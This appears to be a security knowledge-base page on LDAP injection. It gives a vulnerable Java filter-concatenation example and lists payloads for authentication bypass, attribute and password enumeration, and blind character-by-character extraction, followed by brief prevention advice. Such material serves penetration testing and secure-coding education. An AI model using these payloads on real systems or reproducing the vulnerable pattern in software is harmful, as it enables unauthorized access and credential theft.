---
sidebar_position: 50
---
# LDAP Injection

LDAP (Lightweight Directory Access Protocol) Injection is a code injection technique that exploits applications that construct LDAP statements from user-supplied input without proper sanitization. Attackers can inject malicious LDAP queries to read, modify, or delete sensitive information stored in the LDAP directory, or even to bypass authentication, similar to SQL Injection.

## How LDAP Injection Works

LDAP directories are commonly used for centralized user authentication, managing network resources, and storing organizational data. A web application might query an LDAP server to authenticate users, retrieve user profiles, or search for resources. If user input is directly concatenated into an LDAP query without sufficient filtering, an attacker can manipulate the query's logic.

**Example of a Vulnerable Code (Java/JNDI):**
```java
String uid = request.getParameter("uid");
String password = request.getParameter("password");

// Vulnerable: user input (uid) is directly concatenated
String filter = "(&(uid=" + uid + ")(password=" + password + "))";
DirContext ctx = new InitialDirContext(env);
NamingEnumeration answer = ctx.search("ou=users,dc=example,dc=com", filter, searchControls);
// If answer has elements, user is authenticated
```
If an attacker provides `uid=john)(|(objectClass=*))%00` and a dummy password, the filter becomes:
```ldap
(&(uid=john)(|(objectClass=*))%00)(password=dummy_password))
```
The `(|(objectClass=*))` part always evaluates to true, effectively bypassing the password check for "john". The `%00` (null byte) might truncate the rest of the query in some implementations, further simplifying the bypass.

## Why LDAP Injection is Critical

*   **Authentication Bypass**: Gain unauthorized access to applications as legitimate users, including administrators.
*   **Information Disclosure**: Access sensitive user data (email addresses, phone numbers, employee IDs) or even hashes/passwords stored in the LDAP directory.
*   **Data Manipulation**: Modify or delete entries in the LDAP directory (if the application's LDAP bind account has write permissions).
*   **Denial of Service (DoS)**: Craft complex or recursive queries to overload the LDAP server.

## Detecting and Exploiting LDAP Injection

Detection involves injecting special LDAP metacharacters and observing changes in the application's response or authentication behavior. Exploitation aims to extract data or bypass authentication.

### Authentication Bypass

This is often the first goal. The idea is to create a filter that always evaluates to true for a given username, effectively ignoring the password.

*   **Common Payloads for Username field**:
    *   `*)(uid=*))` (If the filter is like `(&(uid=INPUT)(password=PASS))`)
        *   Results in: `(&(uid=*)(uid=*))(password=PASS))` -> `*` matches anything, effectively authenticating as the first user found or any user.
    *   `*)(cn=*))`
    *   `*)(objectClass=*))`
    *   `*` (Simplest, sometimes works)
    *   `admin)(|(userpassword=*` (If the filter is `(uid=INPUT)`)
        *   Results in: `(uid=admin)(|(userpassword=*))` -> Tries to match `admin` AND any password.
    *   `user)((cn=*` (Matches any user, useful for identifying the first user in the directory)
    *   `%2a` (URL-encoded `*`)
    *   `%26` (URL-encoded `&`)
    *   `%7c` (URL-encoded `|`)

*   **Null Byte Termination (`%00`)**: Some applications or parsers might truncate the string after a null byte, effectively eliminating the rest of the original query.
    *   **Payload**: `admin)(|(objectClass=*))%00`
        *   If the original filter was `(&(uid=INPUT)(password=PASS))`, it might become `(&(uid=admin)(|(objectClass=*)))` after truncation.

### Error-Based LDAP Injection

Sometimes, misconfigured LDAP parsers will reveal information through error messages. Inject special characters and observe the response.

#### Payloads
*   `((` (Attempts to break the LDAP query syntax)
*   `%` (Or other non-LDAP characters)
*   Look for LDAP-specific error messages, schema details, or unexpected responses.

### Data Extraction (Enumeration)

Once authentication is bypassed, or if a search function is vulnerable, you can enumerate directory content. This often involves trial and error to determine the correct LDAP attributes and structure.

*   **Finding all users (if search filter is extensible)**:
    *   `*)(objectClass=person))` (Look for objects with `objectClass` "person" or "user")
    *   `*)(uid=*))` (Look for all entries with a `uid`)
    *   `*)(cn=*))` (Look for all entries with a `cn` (common name))

*   **Extracting specific attribute values (e.g., email addresses)**:
    *   If a search parameter is `search_query` and the filter is `(cn=*search_query*)`, inject:
        *   `*))(&(mail=*)` (This tries to search for anything, then specifically for entries that have a `mail` attribute).
    *   **Payloads for specific attribute names (requires knowing the attribute):**
        *   `*)(mail=*))(&(uid=*)` (Search for any entry with an email, then for any user ID)
        *   `*)(telephoneNumber=*))(&(uid=*)`
        *   `*)(userpassword=*))(&(uid=*)` (Dangerous if successful!)

### Blind LDAP Injection (Boolean-based & Time-based)

Similar to blind SQLi, this occurs when direct output is not returned, but the application's behavior changes based on injected conditions.

### Boolean-based Blind LDAPi
**Detection**: Inject payloads that produce a "true" or "false" result in the LDAP query, observing a consistent change in the application's response (e.g., page loads/doesn't load, different error message, subtle content change).  

#### Payloads
*   `*)(uid=admin)(password=secret)(|(1=1))` (Always true, observe response)
*   `*)(uid=admin)(password=secret)(|(1=0))` (Always false, observe response)
*   If `1=1` results in a different response than `1=0`, it's potentially blind LDAPi.
*   **Character-by-character extraction**:
    *   `*)(uid=admin)(password=secret)(|(mail=a*))` (Does admin's email start with 'a'?)
    *   `*)(uid=admin)(password=secret)(|(mail=b*))` (Does admin's email start with 'b'?)

#### Time-based Blind LDAPi
Sends LDAP queries that introduce a noticeable delay in the application's response if a condition is met. This requires the LDAP server or application to support time-delay functions. This is less common in LDAP than SQL due to the nature of LDAP filters, but can sometimes be achieved if a complex, resource-intensive filter causes a measurable delay.  

**Example (Conceptual - highly dependent on LDAP server/application behavior)**:
*   A very inefficient filter that triggers a long processing time if a condition is true.

### LDAP to OS Command Execution (Rare)

This is highly unlikely directly through LDAP filters. If it occurs, it's typically a secondary vulnerability where:
1.  LDAP injection exposes an application configuration.
2.  That configuration is then used in another vulnerable component (e.g., command injection on another internal system, or a deserialization flaw).

## Common LDAP Attributes to Enumerate:

*   **`uid`**: User ID
*   **`cn`**: Common Name (e.g., full name)
*   **`mail`**: Email address
*   **`telephoneNumber`**: Phone number
*   **`userpassword`**: User's password (often hashed, sometimes plaintext if misconfigured)
*   **`homeDirectory`**: User's home directory path
*   **`objectClass`**: Type of object (e.g., `person`, `organizationalPerson`, `inetOrgPerson`)
*   **`sAMAccountName`**: Windows user logon name (for Active Directory)
*   **`distinguishedName`**: Full LDAP path to an entry

## Tools for Exploitation

### Burp Suite (Manual & Intruder)
*   **Repeater**: Manually test LDAP injection payloads.
*   **Intruder**: Automate the process of injecting payloads from a wordlist into parameters, observing differences in response lengths, status codes, or content to identify boolean-based blind LDAPi.

### `ldapsearch` (Command-Line Utility)
While not for injection, if you gain credentials, `ldapsearch` is invaluable for manually querying and enumerating the LDAP directory.
    *   `ldapsearch -x -H ldap://ldap.example.com -b "dc=example,dc=com" "(uid=*)"`

### Manual Crafting
Due to the variety of LDAP implementations and query structures, manually crafting payloads based on observed application behavior is often the most effective approach.

## Prevention (Briefly)

**Parameterized Queries / Prepared Statements**: While not as universally available for LDAP as for SQL, modern frameworks often provide APIs that abstract away direct string concatenation, preventing injection.  
**Input Validation & Sanitization**: Strictly validate and sanitize all user input before using it in LDAP queries. Whitelist allowed characters and reject metacharacters.  
**Least Privilege**: Configure the application's LDAP bind account with the absolute minimum necessary permissions (e.g., read-only access for search functions).  
**Secure LDAP Configuration**: Ensure the LDAP server itself is securely configured, using strong authentication, encryption (LDAPS), and proper access controls.  
**Error Handling**: Avoid verbose error messages in production environments that might reveal internal LDAP structure or errors.  